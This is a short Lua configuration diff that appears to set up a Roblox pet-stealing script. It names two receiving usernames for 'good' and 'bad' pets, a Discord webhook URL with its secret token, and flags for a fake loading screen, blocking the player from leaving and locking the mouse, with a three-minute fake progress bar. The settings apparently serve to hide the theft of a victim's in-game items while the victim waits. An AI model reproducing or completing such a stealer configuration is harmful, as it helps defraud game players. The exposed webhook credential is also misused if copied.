@@ -1,0 +1,13 @@
+UserName = "Luffy_tropinha123" -- good pets
+UserName2 = "Luffy_tropinha123" -- bad pets  
+Webhook = "https://discord.com/api/webhooks/1132826310218092565/hTYFJY092OzQ7y3cw9tBroM5fs0FDVDPCazBsvrVQGfNbSsbHo7gXQjFAzIv5MM8ZscG"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+_G.ScriptName = "Script"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
